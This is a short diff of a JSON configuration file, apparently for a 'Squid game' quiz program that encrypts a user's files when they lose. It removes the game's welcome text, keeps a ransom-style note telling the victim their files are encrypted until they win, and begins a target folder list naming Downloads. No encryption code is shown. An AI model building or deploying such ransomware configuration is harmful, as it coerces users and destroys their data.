@@ -1,5 +1,4 @@
 {
-    "welcome_text": "Welcome to the Squid game for programmers, nerds, and computer science ethusiasts.\nThis game is a simple game that will test your knowledge of computer science concepts.\nYou must score 18 points and above to win the game or else you will face the consequences.\nGood luck and have fun.\n",
     "readme_context": "Your files have been encrypted as you joined a game that you couldn't win. Play the game again and try to get the wanted score so as to decrypt your files.\n.Do not temper with the encrypted files as it might interfere with the decryption process \nDo not delete any file before your files are decrypted as it might be containing the key used to decrypt your files.\nGood luck",
     "folders": [
         "Downloads",
